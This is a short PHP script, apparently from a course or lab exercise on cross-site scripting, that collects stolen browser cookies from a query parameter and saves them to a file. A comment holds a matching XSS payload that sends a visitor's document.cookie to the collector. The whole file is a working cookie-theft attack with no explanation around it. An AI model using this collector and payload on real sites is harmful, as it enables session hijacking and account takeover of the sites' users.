<?php
	$fp=fopen("saved.txt", 'w');
	$cook= $_GET['cookies'];
	fwrite($fp, $cook."\n\n");
	fclose($fp);
	echo $cook;
	header("location: ".$_SERVER['HTTP_REFERET']);
/* <script type="text/javascript">
	window.location='http://127.0.0.1/scfinal/xss/savecookie.php?cookies='+document.cookie;
</script>
<script type="text/javascript">
	window.location='http://127.0.0.1/scfinal/xss/savecookie.php?cookies=hola;
</script>
*/
?>
